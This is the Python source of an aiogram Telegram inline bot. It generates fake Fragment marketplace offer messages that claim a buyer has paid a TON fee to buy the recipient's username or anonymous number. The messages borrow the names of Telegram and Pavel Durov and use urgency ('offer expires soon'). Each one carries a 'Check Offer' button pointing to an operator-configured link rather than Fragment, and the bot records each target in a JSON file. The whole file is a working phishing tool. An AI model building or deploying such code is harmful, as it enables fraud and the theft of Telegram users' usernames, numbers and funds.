import logging
import requests
import os
import json
from dotenv import load_dotenv
from uuid import uuid4
from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ChosenInlineResult
)
from aiogram.enums.parse_mode import ParseMode

load_dotenv()
TOKEN = os.getenv("TOKEN")
OFFER_LINK = os.getenv("OFFER_LINK")
TON_COMMISSION = float(os.getenv("TON_COMMISSION"))
MESSAGE_TEMPLATE = os.getenv("MESSAGE_TEMPLATE", "1")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

OFFERS_FILE = "offers.json"

temp_offer_cache = {}

def get_ton_price():
    try:
        response = requests.get('https://tonapi.io/v2/rates?tokens=ton&currencies=usd')
        response.raise_for_status()
        data = response.json()
        ton_price = data['rates']['TON']['prices']['USD']
        return ton_price
    except Exception as e:
        logger.error(f"Ошибка получения курса TON: {e}")
        return None

def format_ton(amount: float) -> int | float:
    return int(amount) if amount % 1 == 0 else round(amount, 2)

def save_offer(identifier: str, price_ton):
    offers = {}
    if os.path.exists(OFFERS_FILE):
        with open(OFFERS_FILE, 'r', encoding='utf-8') as f:
            offers = json.load(f)

    if identifier.startswith('+') or identifier.isdigit():
        identifier = ''.join(filter(str.isdigit, identifier))

    offers[identifier] = price_ton

    with open(OFFERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(offers, f, indent=4)

def generate_offer_text(identifier, price_ton_str, price_usd, ton_commission_str, ton_comission_usd):
    is_phone = identifier.startswith(('+', '8')) and identifier.replace('+', '').isdigit()
    anon_number = f"+{identifier.lstrip('+')}" if is_phone else None
    username = identifier if not is_phone else None

    if MESSAGE_TEMPLATE == "2":
        if is_phone:
            title = f"Offer {price_ton_str} TON (~${price_usd}) for anonymous number {anon_number}"
            text = (
                f"💎 <b>New order for the purchase of anonymous number has been submitted</b>\n\n"
                f"<blockquote>Buyer has transferred funds and paid the commission, please check if the amount is correct and confirm the transaction.</blockquote>\n\n"
                f"💎 <b>Amount</b>: {price_ton_str} TON\n"
                f"💎 <b>Commission</b>: {ton_commission_str} TON\n\n"
                f"Confirm the sale {anon_number} below or it will be canceled"
            )
        else:
            title = f"Offer {price_ton_str} TON (~${price_usd}) for username @{username}"
            text = (
                f"💎 <b>New order for the purchase of username has been submitted</b>\n\n"
                f"<blockquote>Buyer has transferred funds and paid the commission, please check if the amount is correct and confirm the transaction.</blockquote>\n\n"
                f"💎 <b>Amount</b>: {price_ton_str} TON\n"
                f"💎 <b>Commission</b>: {ton_commission_str} TON\n\n"
                f"Confirm the sale @{username} below or it will be canceled"
            )

    elif MESSAGE_TEMPLATE == "3":
        if is_phone:
            title = f"Offer {price_ton_str} TON (~${price_usd}) for anonymous number {anon_number}"
            text = (
                f"💎 <b>New offer for {anon_number}</b>\n\n"
                f"Someone just offered 💎 <b>{price_ton_str} TON</b> for your anonymous number.\n"
                f"They’ve already paid the 💎 <b>{ton_commission_str} TON</b> fee to notify you.\n\n"
                f"<blockquote>Review and confirm the deal below if you're interested.\nOffer expires soon.</blockquote>\n\n"
                f"<i>Fragment is the official marketplace recommended by Telegram.</i>"
            )
        else:
            title = f"Offer {price_ton_str} TON (~${price_usd}) for username @{username}"
            text = (
                f"💎 <b>New offer for @{username}</b>\n\n"
                f"Someone just offered 💎 <b>{price_ton_str} TON</b> for your username.\n"
                f"They’ve already paid the 💎 <b>{ton_commission_str} TON</b> fee to notify you.\n\n"
                f"<blockquote>Review and confirm the deal below if you're interested.\nOffer expires soon.</blockquote>\n\n"
                f"<i>Fragment is the official marketplace recommended by Telegram.</i>"
            )

    else:
        if is_phone:
            title = f"Offer {price_ton_str} TON (~${price_usd}) for anonymous number {anon_number}"
            text = (
                f"<b>Someone offered 💎 {price_ton_str} TON (~${price_usd}) to buy your anonymous number {anon_number}.</b>\n\n"
                f"If you wish to sell this number, please press the button below and check if the offer suits you.\n\n"
                f"<a href='https://fragment.com/'>Fragment</a> is a verified platform for buying and selling usernames and anonymous numbers that is recommended by <a href='https://t.me/telegram'>Telegram</a> and its founder <a href='https://t.me/durov/'>Pavel Durov</a>.\n\n"
                f"This offer is likely to be serious, because the sender paid 💎 <b>{ton_commission_str} TON</b> (~${ton_comission_usd}) as fee to let you know about it."
            )
        else:
            title = f"Offer {price_ton_str} TON (~${price_usd}) for username @{username}"
            text = (
                f"<b>Someone offered 💎 {price_ton_str} TON (~${price_usd}) to buy your username @{username}.</b>\n\n"
                f"If you wish to sell this username, please press the button below and check if the offer suits you.\n\n"
                f"<a href='https://fragment.com/'>Fragment</a> is a verified platform for buying and selling usernames and anonymous numbers that is recommended by <a href='https://t.me/telegram'>Telegram</a> and its founder <a href='https://t.me/durov/'>Pavel Durov</a>.\n\n"
                f"This offer is likely to be serious, because the sender paid 💎 <b>{ton_commission_str} TON</b> (~${ton_comission_usd}) as fee to let you know about it."
            )

    return title, text

async def inline_query_handler(inline_query: InlineQuery):
    query = inline_query.query.strip()
    parts = query.split(" ", 1)

    if len(parts) != 2:
        return

    identifier, price_str = parts
    identifier = identifier.lstrip('@')

    ton_price = get_ton_price()
    if ton_price is None:
        return

    is_usd = price_str.startswith('$') or price_str.endswith('$')
    price_str_clean = price_str.replace('$', '')

    try:
        amount = float(price_str_clean)
    except ValueError:
        return

    if is_usd:
        price_usd = int(amount)
        price_ton = price_usd / ton_price
        price_ton_str = f"{price_ton:.2f}"
    else:
        price_ton = amount
        price_usd_val = price_ton * ton_price
        price_usd = round(price_usd_val, 2)
        price_ton_str = f"{price_ton}" if price_ton % 1 else f"{int(price_ton)}"

    ton_comission_usd_val = round(TON_COMMISSION * ton_price, 2)
    ton_comission_usd = f"{ton_comission_usd_val:.2f}" if ton_comission_usd_val % 1 else f"{int(ton_comission_usd_val)}"
    ton_commission_str = f"{TON_COMMISSION}" if TON_COMMISSION % 1 else f"{int(TON_COMMISSION)}"

    title, text = generate_offer_text(
        identifier, price_ton_str, price_usd,
        ton_commission_str, ton_comission_usd
    )

    if identifier.replace('+', '').isdigit():
        param = f"?number={identifier}"
    else:
        param = f"?username={identifier}"

    offer_url = OFFER_LINK + param

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Check Offer", url=offer_url)]
        ]
    )

    result_id = str(uuid4())
    result = InlineQueryResultArticle(
        id=result_id,
        title=title,
        input_message_content=InputTextMessageContent(
            message_text=text,
            parse_mode=ParseMode.HTML
        ),
        reply_markup=keyboard
    )

    temp_offer_cache[result_id] = {
        "identifier": identifier,
        "price_ton": format_ton(price_ton)
    }

    await inline_query.answer([result], cache_time=0)

async def chosen_inline_result_handler(chosen_result: ChosenInlineResult):
    result_id = chosen_result.result_id
    offer_data = temp_offer_cache.get(result_id)

    if offer_data:
        save_offer(offer_data["identifier"], offer_data["price_ton"])
        logger.info(f"Saved offer for {offer_data['identifier']}: {offer_data['price_ton']} TON")

async def main():
    bot = Bot(token=TOKEN)
    dp = Dispatcher()

    dp.inline_query.register(inline_query_handler)
    dp.chosen_inline_result.register(chosen_inline_result_handler)

    await dp.start_polling(bot)

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())